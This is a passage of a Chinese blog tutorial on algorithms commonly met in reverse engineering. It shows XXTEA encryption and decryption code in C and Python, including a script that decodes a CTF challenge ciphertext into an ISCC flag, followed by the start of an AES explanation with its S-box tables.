class="hljs-number">0</span>) &#123;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br><br>        <span class="hljs-keyword">for</span> (p = n; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>            z = data[p - <span class="hljs-number">1</span>];<br>            y = data[p] -= MX;<br>        &#125;<br><br>        z = data[n];<br>        y = data[<span class="hljs-number">0</span>] -= MX;<br>        sum -= DELTA;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>有些没6+52&#x2F;(n+1)，但还是有其他特征,而且delta也很明显</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707985910721-26f9b574-a04a-4de6-8673-6e54e3769817.png" class="" title="img"><p>下面是运行脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//加密函数</span><br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">//解密函数</span><br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">689085350</span>, <span class="hljs-number">626885696</span>, <span class="hljs-number">1894439255</span>, <span class="hljs-number">1204672445</span>, <span class="hljs-number">1869189675</span>, <span class="hljs-number">475967424</span>, <span class="hljs-number">1932042439</span>, <span class="hljs-number">1280104741</span>, <span class="hljs-number">2808893494</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">12345678</span>, <span class="hljs-number">12398712</span>, <span class="hljs-number">91283904</span>, <span class="hljs-number">12378192</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">9</span>;<br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>import base64<br>from ctypes import *<br><br>enc=<span class="hljs-string">&quot;F8URvwNjuAYMN6GVXvgJE1Oe2ULWWow0WThUe0k95xTg60OY&quot;</span><br>data=<span class="hljs-built_in">list</span>(base64.b64decode(enc))<br>enc=[<span class="hljs-type">int</span>.from_bytes(data[i:i + <span class="hljs-number">4</span>], <span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(data),<span class="hljs-number">4</span>)]<br>key=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(ord,<span class="hljs-string">&quot;0M21I908n117gC1~&quot;</span>))<br>key=[<span class="hljs-type">int</span>.from_bytes(key[i:i + <span class="hljs-number">4</span>], <span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(key),<span class="hljs-number">4</span>)]<br><br><br>def MX(z, y, sum1, k, p, e):<br>    <span class="hljs-keyword">return</span>   c_uint32(((z.value&gt;&gt;<span class="hljs-number">5</span>^y.value&lt;&lt;<span class="hljs-number">2</span>)+(y.value&gt;&gt;<span class="hljs-number">3</span>^z.value&lt;&lt;<span class="hljs-number">4</span>))^((sum1.value^y.value)+(k[(p&amp;<span class="hljs-number">3</span>)^e.value]^z.value)))<br>def btea(v,k,n,delta):<br><br>    <span class="hljs-keyword">if</span> n&gt;<span class="hljs-number">1</span>:<br>        sum1=c_uint32(<span class="hljs-number">0</span>)<br>        z=c_uint32(v[n<span class="hljs-number">-1</span>])<br>        rounds=<span class="hljs-number">6</span>+<span class="hljs-number">52</span><span class="hljs-comment">//n</span><br>        e=c_uint32(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-keyword">while</span> rounds&gt;<span class="hljs-number">0</span>:<br>            sum1.value+=delta<br>            e.value=((sum1.value&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">for</span> p in range(n<span class="hljs-number">-1</span>):<br>                y=c_uint32(v[p+<span class="hljs-number">1</span>])<br>                v[p] = c_uint32(v[p] + MX(z,y,sum1,k,p,e).value).value<br>                z.value=v[p]<br><br>            y=c_uint32(v[<span class="hljs-number">0</span>])<br>            v[n<span class="hljs-number">-1</span>] = c_uint32(v[n<span class="hljs-number">-1</span>] + MX(z,y,sum1,k,n<span class="hljs-number">-1</span>,e).value).value<br>            z.value=v[n<span class="hljs-number">-1</span>]<br>            rounds-=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        sum1=c_uint32(<span class="hljs-number">0</span>)<br>        n=-n<br>        rounds=<span class="hljs-number">6</span>+<span class="hljs-number">52</span><span class="hljs-comment">//(n+1)</span><br>        sum1.value=rounds*delta<br>        y=c_uint32(v[<span class="hljs-number">0</span>])<br>        e=c_uint32(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-keyword">while</span> rounds&gt;<span class="hljs-number">0</span>:<br>            e.value=((sum1.value&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">for</span> p in range(n<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>):<br>                z=c_uint32(v[p<span class="hljs-number">-1</span>])<br>                v[p] = c_uint32(v[p] - MX(z,y,sum1,k,p,e).value).value<br>                y.value=v[p]<br><br>            z=c_uint32(v[n<span class="hljs-number">-1</span>])<br>            v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z,y,sum1,k,<span class="hljs-number">0</span>,e).value).value<br>            y.value=v[<span class="hljs-number">0</span>]<br>            sum1.value-=delta<br>            rounds-=<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    a=enc<br>    k= key<br>    delta=<span class="hljs-number">0x9e3779b9</span><br>    n=len(a)<br>    res=btea(a,k,-n,delta)<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">    import libnum</span><br><span class="hljs-string">    for i in res:</span><br><span class="hljs-string">        flag+=(libnum.n2s(i)[::-1].decode())</span><br><span class="hljs-string">    print(&quot;ISCC&#123;&quot;+flag.strip()+&quot;&#125;&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>参考链接： <a href="https://zhuanlan.zhihu.com/p/78913397">https://zhuanlan.zhihu.com/p/78913397</a></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>AES算法主要有四种操作处理，分别是密钥加法层、字节代换层、行位移层、列混淆层。而明文x和密钥k都是由16个字节组成的数据</p><p>AES算法在处理的轮数上只有最后一轮操作与前面的轮处理上有些许不同，在轮处理开始前还单独进行了一次轮密钥加的处理。在处理轮数上，我们只考虑<strong>128位密钥的10轮处理</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690008868545-fdc00de5-23b1-42c8-8d20-6418580919d6.png" class="" title="img"><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>S_box表是通过某种方法计算出来的。S_box表是一个拥有256个字节元素的数组，可以将其定义为一维数组，也可以将其定义为16×16的二维数组，如果将其定义为二维数组，读取S_box数据的方法就是要将输入数据的<strong>每个字节的高四位作为第一个下标，低四位作为第二个下标</strong>，<strong>从s盒中取出并赋给字符</strong></p><p>s盒和逆s盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>] = &#123;<br><span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>,<br><span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>,<br><span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>,<br><span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,<br><span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>,<br><span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>,<br><span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>,<br><span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,<br><span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>,<br><span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>,<br><span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>,<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>,<br><span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,<br><span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inv_S[<span class="hljs-number">256</span>] = &#123;<br><span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>,<br><span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>,<br><span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>,<br><span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>,<br><span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>,<br><span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>,<br><span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br><span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>,<br><span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>,<br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>,<br><span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span 